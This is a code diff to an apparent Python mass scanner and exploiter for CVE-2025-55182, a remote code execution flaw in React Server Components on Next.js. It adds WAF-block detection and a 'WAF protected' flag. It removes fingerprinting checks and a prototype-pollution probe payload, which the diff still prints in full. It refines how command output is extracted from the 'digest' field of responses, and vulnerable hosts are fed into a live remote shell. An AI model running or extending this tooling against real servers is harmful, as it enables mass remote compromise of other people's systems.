@@ -162,6 +162,52 @@ def is_mitigated_host(response: requests.Response) -> bool:
     )
 
 
+def is_waf_block(response: requests.Response) -> bool:
+    """Detect WAF/security blocks in response"""
+    try:
+        status = response.status_code
+        body = response.text.lower()
+        headers_str = str(response.headers).lower()
+        
+        # Common WAF block indicators
+        waf_signatures = [
+            'request rejected',
+            'access denied',
+            'forbidden',
+            'blocked',
+            'firewall',
+            'security',
+            'protection',
+            'your support id is',
+            'incident id',
+            'reference id',
+            '<title>error',
+            '<title>403',
+            '<title>request rejected',
+            'cloudflare',
+            'akamai',
+            'imperva',
+            'f5',
+            'barracuda',
+        ]
+        
+        # Status code checks
+        if status in [403, 406, 429, 503]:
+            return True
+            
+        # Content checks
+        if any(sig in body for sig in waf_signatures):
+            return True
+            
+        # Very short HTML response with error title
+        if '<html>' in body and len(body) < 1000 and any(x in body for x in ['<title>error', '<title>403', 'rejected']):
+            return True
+            
+        return False
+    except:
+        return False
+
+
 @dataclass
 class ScanResult:
     """Data class for storing scan results"""
@@ -174,6 +220,7 @@ class ScanResult:
     timestamp: str
     error: Optional[str] = None
     execOutput: Optional[str] = None
+    wafProtected: bool = False  # RSC detected but WAF blocks exploitation
 
 
 class UrlParser:
@@ -373,7 +420,7 @@ class RscScanner:
         )
     
     def _passiveScan(self, url: str) -> Tuple[bool, List[str]]:
-        """Passive detection with enhanced RSC fingerprinting"""
+        """Passive detection - simplified and reliable"""
         details = []
         score = 0
         
@@ -381,15 +428,8 @@ class RscScanner:
             response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
             contentType = response.headers.get('Content-Type', '')
             html = response.text[:100000]  # Limit to first 100KB for performance
-            headers = response.headers
             
-            # CRITICAL: X-Action-Redirect header check (definitive RCE proof)
-            xActionRedirect = headers.get('X-Action-Redirect', '')
-            if re.search(r'.*/login\?a=11111.*', xActionRedirect):
-                score += 100
-                details.append(f"X-Action-Redirect RCE proof: {xActionRedirect} (CRITICAL)")
-            
-            # Primary indicators (high confidence)
+            # Critical indicators only - high confidence
             if 'text/x-component' in contentType:
                 score += 100
                 details.append("Content-Type: text/x-component")
@@ -398,84 +438,9 @@ class RscScanner:
                 score += 80
                 details.append("window.__next_f detected")
             
-            # React Server Components patterns
             if 'react-server-dom-webpack' in html:
                 score += 30
                 details.append("react-server-dom-webpack found")
-            
-            # Next.js RSC chunk patterns (flight protocol markers)
-            if re.search(r'\d+:["\w]+', html) and ('self.__next' in html or 'window.__next' in html):
-                score += 40
-                details.append("Next.js RSC chunk pattern")
-            
-            # __NEXT_DATA__ fingerprint (reliable Next.js indicator)
-            if '__NEXT_DATA__' in html:
-                score += 25
-                details.append("__NEXT_DATA__ runtime marker")
-            
-            # Shodan-identified headers (narrowed attack surface indicators)
-            # x-nextjs-prerender presence indicates prerendering capability
-            if headers.get('x-nextjs-prerender'):
-                score += 30
-                details.append(f"x-nextjs-prerender: {headers.get('x-nextjs-prerender')}")
-            
-            # x-nextjs-stale-time indicates ISR (Incremental Static Regeneration)
-            if headers.get('x-nextjs-stale-time'):
-                score += 25
-                details.append(f"x-nextjs-stale-time: {headers.get('x-nextjs-stale-time')}")
-            
-            # x-middleware-rewrite is critical for exploit conditions
-            if headers.get('x-middleware-rewrite'):
-                score += 40
-                details.append(f"x-middleware-rewrite detected (critical)")
-            
-            # x-middleware-subrequest vulnerability indicator
-            if headers.get('x-middleware-subrequest'):
-                score += 50
-                details.append("x-middleware-subrequest header present (exploit condition)")
-            
-            # Vary header with RSC-related values (from Reddit research)
-            varyHeader = headers.get('Vary', '').lower()
-            if 'rsc' in varyHeader:
-                score += 35
-                details.append("Vary: RSC header (React Server Components)")
-            if 'next-router-state-tree' in varyHeader:
-                score += 30
-                details.append("Vary: Next-Router-State-Tree (App Router)")
-            if 'next-router-prefetch' in varyHeader:
-                score += 20
-                details.append("Vary: Next-Router-Prefetch")
-            
-            # Server action indicators
-            if 'Next-Action' in str(response.headers) or re.search(r'["\']Next-Action["\']', html):
-                score += 35
-                details.append("Next-Action header support")
-            
-            # Build manifest files (Next.js specific)
-            if re.search(r'/_next/(static|data)/', html):
-                score += 25
-                details.append("Next.js build artifacts")
-            
-            # Flight data patterns in HTML
-            if re.search(r'"\$L\d+"', html) or re.search(r'"\$@\d+"', html):
-                score += 45
-                details.append("Flight protocol references")
-            
-            # Server Components payload structure
-            if re.search(r'{"then":\s*"\$\w+', html):
-                score += 50
-                details.append("RSC payload structure")
-            
-            # Next.js version header (informational)
-            xNextVersion = response.headers.get('x-powered-by', '')
-            if 'Next.js' in xNextVersion:
-                score += 20
-                details.append(f"Next.js version: {xNextVersion}")
-            # Next.js version header (informational)
-            xNextVersion = response.headers.get('x-powered-by', '')
-            if 'Next.js' in xNextVersion:
-                score += 20
-                details.append(f"Next.js version: {xNextVersion}")
             
             return score >= 50, details
             
@@ -484,11 +449,10 @@ class RscScanner:
             return False, []
     
     def _activeFingerprint(self, url: str) -> Tuple[bool, List[str]]:
-        """Active fingerprinting with enhanced RSC header checks"""
+        """Active fingerprinting with RSC header - simplified"""
         details = []
         
         try:
-            # Primary RSC header test
             response = self.session.get(
                 url,
                 headers={'RSC': '1'},
@@ -506,35 +470,9 @@ class RscScanner:
             if 'RSC' in varyHeader:
                 details.append("Vary: RSC header")
             
-            # React Flight Protocol format detection
+            # React Flight Protocol format: starts with number:type
             if re.match(r'^\d+:["IHL]', body.strip()):
                 details.append("React Flight Protocol")
-            
-            # Test Next.js data endpoint with RSC header
-            dataEndpoint = urljoin(url, '/_next/data')
-            try:
-                dataResp = self.session.get(
-                    dataEndpoint,
-                    headers={'RSC': '1'},
-                    timeout=5
-                )
-                if dataResp.status_code != 404:
-                    details.append("_next/data endpoint accessible")
-            except Exception as e:
-                print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _activeFingerprint _next/data check failed: {e}")
-                pass
-            
-            # Check for Next.js build manifest
-            try:
-                manifestResp = self.session.get(
-                    urljoin(url, '/_next/static/chunks/webpack.js'),
-                    timeout=5
-                )
-                if manifestResp.status_code == 200:
-                    details.append("Next.js webpack chunks present")
-            except Exception as e:
-                print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _activeFingerprint webpack check failed: {e}")
-                pass
             
             return len(details) > 0, details
             
@@ -543,22 +481,13 @@ class RscScanner:
             return False, []
     
     def _checkEndpoints(self, url: str) -> Tuple[bool, List[str]]:
-        """Check for vulnerable endpoints with error-based detection"""
+        """Check for vulnerable endpoints - simplified"""
         details = []
-        
-        # Common Next.js server action endpoints
-        testPaths = [
-            '/_next/data',
-            '/spectre-ghost',
-            '/api/actions',
-            '/',  # Root can also handle server actions
-        ]
+        testPaths = ['/adfa', '/_next/data']
         
         for path in testPaths:
             try:
                 testUrl = urljoin(url, path)
-                
-                # Test 1: Basic Next-Action header acceptance
                 response = self.session.post(
                     testUrl,
                     headers={
@@ -568,77 +497,10 @@ class RscScanner:
                     timeout=5
                 )
                 
-                # Vulnerable if not 404 and shows RSC-related responses
                 if response.status_code != 404:
-                    responseText = response.text.lower()
-                    
-                    # Check for RSC-specific error messages or behaviors
-                    if any(marker in responseText for marker in [
-                        'digest',
-                        'next-action',
-                        'react',
-                        'chunk',
-                        'server function',
-                        '__proto__',
-                        'next_redirect',
-                    ]):
+                    if 'digest' in response.text or 'Next-Action' in str(response.headers):
                         details.append(f"Vulnerable endpoint: {path}")
                         return True, details
-                    
-                    # Even without specific markers, non-404 is suspicious
-                    if response.status_code in [200, 500]:
-                        details.append(f"Suspicious endpoint: {path} (HTTP {response.status_code})")
-                
-                # Test 2: Benign React Flight probe (REACT2SHELL_PROBE marker)
-                # Passive detection without executing commands
-                probePayload = {
-                    'then': '$1:__proto__:then',
-                    'status': 'resolved_model',
-                    'reason': -1,
-                    'value': '{"then": "$B0"}',
-                    '_response': {
-                        '_prefix': "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:'REACT2SHELL_PROBE'});",
-                        '_formData': {
-                            'get': '$1:constructor:constructor',
-                        },
-                    },
-                }
-                
-                probeFiles = {
-                    '0': (None, json.dumps(probePayload)),
-                    '1': (None, '"$@0"'),
-                }
-                
-                errorResp = self.session.post(
-                    testUrl,
-                    files=probeFiles,
-                    headers={'Next-Action': 'x'},
-                    timeout=5
-                )
-                
-                # Check for Vercel/Netlify mitigations (filter false positives)
-                if is_mitigated_host(errorResp):
-                    details.append(f"{path} - Mitigated (Vercel/Netlify protection)")
-                    continue
-                
-                # Check if benign probe returned the REACT2SHELL_PROBE marker
-                if 'REACT2SHELL_PROBE' in errorResp.text:
-                    details.append(f"REACT2SHELL_PROBE confirmed on {path} (high confidence vulnerability)")
-                    return True, details
-                
-                errorText = errorResp.text.lower()
-                
-                # Look for React/Next.js specific error patterns
-                if any(pattern in errorText for pattern in [
-                    'syntaxerror',
-                    'unexpected token',
-                    'function',
-                    'native code',
-                    'react',
-                    'chunk',
-                ]):
-                    details.append(f"Error-based detection: {path}")
-                    return True, details
                         
             except Exception as e:
                 print(f"{Fore.YELLOW}[DEBUG]{Style.RESET_ALL} _checkEndpoints error for {path}: {e}")
@@ -927,9 +789,20 @@ class MassScanner:
                     
                     print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                     
+                    # Check for WAF blocks
+                    if is_waf_block(response):
+                        print(f"{Colors.RED}[DEBUG] WAF block detected, skipping endpoint{Colors.RESET}")
+                        continue
+                    
                     if response.status_code == 200 and response.text:
+                        # Validate it's not an error page
+                        body_lower = response.text.lower()
+                        if '<html>' in body_lower and len(response.text) < 2000:
+                            # Likely an error page, not command output
+                            print(f"{Colors.YELLOW}[DEBUG] Looks like error page, not command output{Colors.RESET}")
+                            continue
                         # Return the actual response text
-                        print(f"{Colors.GREEN}[DEBUG] Got response from endpoint!{Colors.RESET}")
+                        print(f"{Colors.GREEN}[DEBUG] Got valid response from endpoint!{Colors.RESET}")
                         return response.text[:500]  # Return first 500 chars
                         
                 except Exception as e:
@@ -1013,23 +886,34 @@ class MassScanner:
                     
                     print(f"{Colors.BLUE}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                     
+                    # Check for WAF blocks first
+                    if is_waf_block(response):
+                        print(f"{Colors.RED}[DEBUG] WAF block detected, skipping endpoint{Colors.RESET}")
+                        continue
+                    
                     # Extract output from digest field in error response
                     if "NEXT_REDIRECT" in response.text or "digest" in response.text:
                         print(f"{Colors.GREEN}[DEBUG] Found NEXT_REDIRECT or digest in response!{Colors.RESET}")
+                        
                         # Parse the digest field which contains command output
                         match = re.search(r'"digest":"([^"]+)"', response.text)
                         if match:
-                            print(f"{Colors.GREEN}[DEBUG] Extracted digest: {match.group(1)[:100]}{Colors.RESET}")
-                            return match.group(1)
+                            digest = match.group(1)
+                            # Validate digest doesn't look like error message
+                            if len(digest) > 0 and not any(x in digest.lower() for x in ['error', 'rejected', 'forbidden', 'html']):
+                                print(f"{Colors.GREEN}[DEBUG] Extracted digest: {digest[:100]}{Colors.RESET}")
+                                return digest
+                            else:
+                                print(f"{Colors.YELLOW}[DEBUG] Digest looks like error message, skipping{Colors.RESET}")
+                                continue
+                        
                         # Sometimes it's in a different format
                         match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
                         if match:
                             result = match.group(1).strip('"\'')
-                            print(f"{Colors.GREEN}[DEBUG] Extracted digest (alt format): {result[:100]}{Colors.RESET}")
-                            return result
-                        # Return raw if we can't parse but know it worked
-                        print(f"{Colors.YELLOW}[DEBUG] Couldn't parse digest, returning raw response{Colors.RESET}")
-                        return response.text[:500]
+                            if len(result) > 0 and not any(x in result.lower() for x in ['error', 'rejected', 'forbidden']):
+                                print(f"{Colors.GREEN}[DEBUG] Extracted digest (alt format): {result[:100]}{Colors.RESET}")
+                                return result
                         
                 except Exception as e:
                     print(f"{Colors.YELLOW}[DEBUG] Endpoint error: {e}{Colors.RESET}")
@@ -1101,12 +985,17 @@ class MassScanner:
                     # Execute command if vulnerable
                     if result.vulnerable and self.execCommand:
                         result.execOutput = self.executeRemoteCommand(result.url, None)
+                        
+                        # If detection found RSC but exploitation failed, mark as WAF protected
+                        if not result.execOutput or len(result.execOutput.strip()) == 0:
+                            result.wafProtected = True
+                            result.details.append("⚠️ WAF/Protection detected - exploitation blocked")
                     
                     results.append(result)
                     completed.add(url)
                     
-                    # Update live shell with new vulnerable target
-                    if result.vulnerable and liveShell:
+                    # Update live shell with new vulnerable target (only if not WAF protected)
+                    if result.vulnerable and not result.wafProtected and liveShell:
                         liveShell.addVulnerableTarget(result.url)
                     
                     # Print result (skip clean targets in shell mode)
@@ -1193,7 +1082,10 @@ class MassScanner:
                 if domain != result.url:
                     print(f"     {Colors.YELLOW}{result.url}{Colors.RESET}")
                 
-                if result.execOutput:
+                # Show WAF protection status
+                if result.wafProtected:
+                    print(f"     {Colors.YELLOW}⚠️  WAF Protected - exploitation blocked{Colors.RESET}")
+                elif result.execOutput:
                     print(f"     {Colors.MAGENTA}Exec: {result.execOutput.replace(chr(10), ' | ')}{Colors.RESET}")
             
             print(f"\n{Colors.RED}{EMOJI_WARN}  These targets are potentially vulnerable to CVE-2025-55182{Colors.RESET}")
